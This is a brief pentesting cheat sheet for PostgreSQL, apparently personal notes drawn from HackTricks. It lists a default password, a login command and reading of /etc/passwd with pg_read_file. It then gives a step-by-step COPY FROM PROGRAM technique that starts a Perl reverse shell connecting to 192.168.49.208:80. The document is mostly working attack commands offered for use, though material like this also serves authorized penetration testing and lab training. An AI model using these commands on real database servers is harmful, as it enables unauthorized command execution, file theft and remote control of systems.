# Pentesting Postgres

URL Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

URL Reference: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

User Authentication Example:

```
psql -U postgres -p 5437 -h 192.168.208.47
```

Default Passwords:

postgres

Read Directories:

```
pg_ls_dir('./');
```

Read Files:

```
pg_read_file('/etc/passwd');
```

## Creating a reverse shell from within postgres (Linux):

Drop table cmd_exec if it exists:
```
DROP TABLE IF EXISTS cmd_exec;
```

Create table cmd_exec:
```
CREATE TABLE cmd_exec(cmd_output text);
```

Start a reverse shell inside DB with perl (I got this idea from payloadallthethings):
```
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.208:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
